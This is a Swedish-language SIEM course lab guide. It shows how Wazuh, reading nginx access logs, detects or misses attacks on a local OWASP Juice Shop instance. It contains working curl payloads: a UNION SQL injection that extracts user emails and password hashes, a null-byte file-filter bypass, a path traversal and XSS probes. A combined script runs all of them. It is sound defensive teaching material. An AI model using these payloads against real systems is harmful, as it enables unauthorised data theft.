## Web-attacker mot Juice Shop — och hur Wazuh ser dem

Denna branch lägger en **nginx reverse proxy** framför Juice Shop. All
HTTP-trafik passerar genom nginx, som loggar varje request i Combined Log
Format till `/var/log/nginx/access.log`. Wazuh-agenten inne i
nginx-containern läser den filen, och Wazuhs inbyggda regler 31100-serien
känner igen klassiska attack-mönster i URL:er.

Det här är poängen: **rätt loggar på rätt plats = SIEM:en ser attackerna.**

---

### En viktig begreppsdistinktion

**"Attack lyckades i appen" ≠ "Wazuh ser attacken".**

En SOC-analytiker bryr sig om att se *försök*, inte bara *lyckade försök*.
Wazuh's web-regler triggar på misstänkta URL-mönster oavsett vad appen gör
med dem. Det är just det som gör SIEM värdefull — man ser scouterna innan
de hittar dörren som faktiskt går att forcera.

I exemplen nedan kör vi för varje attacktyp **två varianter**: först en
misslyckad eller "första-försök"-payload, sedan en faktiskt fungerande.
Det visar både hur Wazuh känner igen mönster *och* var dess gränser går.

---

### Förutsättningar

Stacken körs (`docker compose up -d` i projektets rot). Juice Shop nås på
`http://localhost:3000` (via nginx).

Wazuh-dashboarden: `https://localhost`. Logga in med `admin` /
`SecretPassword`. I Threat Hunting, sök:

```
agent.name: "nginx-proxy" AND decoder.name: "web-accesslog"
```

Sätt tidsfönstret uppe till höger till "Last 15 minutes" och slå på
auto-refresh för att se nya alerts flöda in.

### Severity-band i dashboarden

Wazuh-dashboarden grupperar alerts i tre band utifrån `rule.level`:

| Etikett i dashboarden | Rule level | Färg |
|---|---|---|
| **Low** | 0–6 | grå/blå |
| **Medium** | 7–11 | gul |
| **High** | 12–15 | röd |

Det är värt att notera redan här: **alla Wazuh's web-attack-regler i
31100-serien har level 5–7**. Det betyder att de flesta web-attacker hamnar
som "Low" eller precis-på-gränsen-Medium i dashboarden — *trots att de är
verkliga attackförsök*. Detta är en återkommande pedagogisk poäng nedan.

---

## Attack 1 — SQL injection

### 1a. Oförsiktig payload (kraschar appen)

Klassisk "första försöket"-payload med fel antal kolumner i UNION:

```bash
curl "http://localhost:3000/rest/products/search?q=apple%27%20UNION%20SELECT%20%2A%20FROM%20users--"
```

(Klartext: `apple' UNION SELECT * FROM users--`)

**App-utfall:** HTTP **500** + SQLite-error i svaret om kolumnantal. Detta
*bevisar* att SQL injection-sårbarheten finns (din input når SQL-motorn),
men attackerna *extraherar ingen data*.

**Wazuh:** Triggar **rule 31103 — "SQL injection attempt"** (severity 7).
Bonus: rule 31122 ("500-error") triggas också.

```
rule.id: 31103
```

### 1b. Fungerande payload (extraherar admin-data)

Med rätt antal kolumner och dummyvärden ger UNION:en faktiskt resultat.
Detta är pwning-guidens [Christmas Special][3]-utmaning:

```bash
curl "http://localhost:3000/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C%274%27%2C%275%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%20FROM%20Users--"
```

(Klartext: `qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--`)

**App-utfall:** HTTP **200** + en lista med alla användares email +
password-hash returneras som "produkter". *Faktiskt lyckad SQL injection.*

**Wazuh:** Triggar **rule 31106 — "A web attack returned code 200 (success)"**
(severity 6).

```
rule.id: 31106 AND data.url: "Users"
```

### Pedagogisk poäng — severity-paradoxen

Båda varianterna upptäcks av Wazuh, men med olika regler och **olika
severity**:

- **1a (kraschar):** level **7** → klassas som **Medium** i dashboarden
- **1b (lyckas):** level **6** → klassas som **Low** i dashboarden

Det är paradoxalt: den **lyckade** SQL injection (som faktiskt extraherar
admin-data) får *lägre* severity än den misslyckade. Anledning: Wazuh kan
med säkerhet säga att 1a är en SQL-injection (mönstret + 500-error är en
stark signal). 1b är försiktigare ("attack-mönster fick 200, troligtvis
suspekt men inte säkert").

> **En SOC som bara filtrerar på "Medium och uppåt" missar lyckade
> attacker.** Severity är en heuristik, inte sanning. Analytikerns jobb är
> att förstå *varför* en alert har sin severity, inte bara reagera på
> siffran.

---

## Attack 2 — Path traversal

### 2a. Klassisk `../etc/passwd` (avvisas av nginx)

Standardpayloaden som varje webbsäkerhetstutorial visar:

```bash
curl "http://localhost:3000/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

(Klartext: `/../../../etc/passwd`)

**App-utfall:** HTTP **400** (Bad Request — nginx normaliserar bort `../`
och tycker URL:n är konstig). Ingen fil läcker.

**Wazuh:** Triggar **rule 31104 — "Common web attack"** (severity 6).

```
rule.id: 31104
```

### 2b. Lyckad bypass — null-byte injection

Juice Shop har en `/ftp/`-endpoint som låter dig läsa filer, men den
filtrerar på filändelse (`.md`, `.pdf`). Lägg till en null-byte med URL-
encoded `%2500` följt av ett fejk-suffix — då tror filtret att det är `.md`
men filsystemet trunkerar vid null-byten:

```bash
curl "http://localhost:3000/ftp/package.json.bak%2500.md"
```

(Klartext: `/ftp/package.json.bak\0.md`)

**App-utfall:** HTTP **200** + faktiskt innehåll av `package.json.bak`
(internt filsystem). *Lyckad path traversal — appens filter bypassad.*

**Wazuh:** **Triggar INGEN alert.**

### Pedagogisk poäng (viktigt!)

Det här är ett *otroligt* viktigt lärtillfälle:

- **Den misslyckade attacken triggar alert.**
- **Den lyckade attacken triggar INGEN alert.**

Wazuh's default-regler känner igen *klassiska* mönster (`../`, `etc/passwd`)
men inte sofistikerade tekniker som null-byte injection. **En SOC blir
inte säker bara av att installera Wazuh** — analytiker måste kunna skriva
custom rules som upptäcker denna typ av bypass.

Detta är direkt motivation för att lära sig regelhantering senare i
kursen. Det är också en realitet i yrket: skickliga angripare anpassar
sig efter vilka regler SIEM:en har, så regelhantering är en pågående
kapplöpning.

(För den som blockerar `.bak` på serverns filändelse triggas däremot
**rule 31516 "Suspicious URL access"** även utan null-byte — så ett
försök *att se* `.bak` är synligt även om null-byte-tricket är osynligt.)

---

## Attack 3 — Cross-Site Scripting (XSS)

### 3a. Klassisk `<script>` i query (mönster syns)

```bash
curl "http://localhost:3000/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

(Klartext: `?q=<script>alert(1)</script>`)

**App-utfall:** HTTP **200** men ingen faktisk XSS-exekvering — denna
endpoint reflekterar inte tillbaka query-parametern i HTML, så ingen kod
körs i klienten.

**Wazuh:** Triggar **rule 31106 — "A web attack returned code 200 (success)"**
(severity 6).

```
rule.id: 31106 AND data.url: "script"
```

### 3b. `javascript:`-protokoll i redirect

Juice Shop har en `/redirect`-endpoint som validerar destinations-URL:en.
Skickas en `javascript:`-URL avvisas den:

```bash
curl "http://localhost:3000/redirect?to=javascript:alert(1)"
```

**App-utfall:** HTTP **406** (Not Acceptable — server avvisar).

**Wazuh:** Triggar **rule 31101 — "Web server 400 error code"** (severity 5).

```
rule.id: 31101
```

### 3c. DOM XSS (osynlig för SIEM)

Juice Shop's faktiska XSS-utmaningar löses via *DOM XSS*, där payloaden
ligger i URL:ens **fragment** (`#`-delen):

```
http://localhost:3000/#/search?q=<iframe src="javascript:alert(`xss`)">
```

> **Viktigt:** URL-fragment (allt efter `#`) **skickas aldrig till servern**.
> Webbläsaren behåller dem lokalt. Det betyder att nginx aldrig ser dem
> och Wazuh kan inte trigga någon alert — *trots att en XSS faktiskt
> exekveras i klientens browser*.

### Pedagogisk poäng

XSS demonstrerar tre olika utfall:
1. **3a:** Mönster i URL → Wazuh ser det, oavsett att det inte exekverade
2. **3b:** Mönster + 4xx → Wazuh ser det, både attack och avslag loggas
3. **3c:** *Faktisk lyckad XSS* via fragment → **helt osynlig för
   server-side SIEM**

Detta är en grundläggande begränsning — server-loggar ser bara det som
servern ser. Klient-side attacker kräver **andra typer av detektion**
(t.ex. Content Security Policy-rapporter, RUM-verktyg, JavaScript-baserad
telemetri). Det är värt att nämna i klassen som motivation till varför
SIEM aldrig ensamt räcker som säkerhetslager.

---

### Bonus — kör samtliga attacker i ett svep

Klistra in detta för att generera alla varianter ovan:

```bash
# SQL injection
curl -s -o /dev/null "http://localhost:3000/rest/products/search?q=apple%27%20UNION%20SELECT%20%2A%20FROM%20users--"
curl -s -o /dev/null "http://localhost:3000/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C%274%27%2C%275%27%2C%276%27%2C%277%27%2C%278%27%2C%279%27%20FROM%20Users--"

# Path traversal
curl -s -o /dev/null "http://localhost:3000/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -s -o /dev/null "http://localhost:3000/ftp/package.json.bak%2500.md"

# XSS (server-synliga varianter)
curl -s -o /dev/null "http://localhost:3000/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
curl -s -o /dev/null "http://localhost:3000/redirect?to=javascript:alert(1)"
```

Vänta cirka 10–30 sekunder, klicka refresh i Threat Hunting i dashboarden,
och du ska se 4–5 nya alerts från `agent.name: "nginx-proxy"`.

(Den fungerande path traversal-attacken syns *inte* — det är poängen.)

---

### Vad vi har lärt oss

1. **Loggformatet styr vad SIEM:en ser.** Juice Shop's egen logg matchar
   inga default-decoders → noll alerts. nginx access.log matchar
   `web-accesslog`-decodern → alerts flödar.

2. **Reverse proxy är inte bara för prestanda.** Att ha nginx framför sin
   app ger en gratis, branschstandard-loggrad där SIEM kan plugga in.

3. **Statuskoden räcker inte.** En "200 OK" kan dölja en lyckad attack;
   en "400 Bad Request" kan vara en avvärjd attack. Wazuh ger oss
   *URL-mönster + status* tillsammans — det är det som gör skillnad.

4. **Default-regler missar sofistikerade attacker.** Null-byte-bypass och
   liknande tekniker triggar inga default-alerts. *Custom rules är inte
   en lyx — det är en nödvändighet i en mogen SOC.*

5. **DOM-baserade attacker är osynliga för server-side SIEM.** URL-
   fragment når aldrig servern, så Wazuh kan inte se dem. Klient-side
   detektion är ett separat säkerhetslager.

6. **Severity är inte sanning.** Wazuh's web-attack-regler hamnar nästan
   alltid på level 5–7 — det vill säga "Low" eller precis-på-gränsen-
   Medium i dashboardens default-vy. *Ironiskt nog får en lyckad attack
   ofta lägre severity än en misslyckad.* En SOC som filtrerar på
   "Medium+" missar verkliga incidenter.

---

### Vidare läsning

- [OWASP Juice Shop — officiella sidan][1]
- [Pwning OWASP Juice Shop — companion guide][2]
- [Christmas Special-utmaningen][3] (förklarar varför Attack 1b's
  payload fungerar — kolumnantal och dummyvärden)
- [Access Log-utmaningen][4] (förklarar null-byte-bypassen i Attack 2b)
- Wazuh-regler för web-attacker finns i `etc/ruleset/rules/0260-web_rules.xml`
  inne i manager-containern. Gå in med
  `docker compose exec wazuh.manager bash` och utforska.

[1]: https://juice-shop.github.io/
[2]: https://pwning.owasp-juice.shop/companion-guide/latest/index.html
[3]: https://pwning.owasp-juice.shop/companion-guide/latest/part2/injection.html
[4]: https://pwning.owasp-juice.shop/companion-guide/latest/part2/sensitive-data-exposure.html
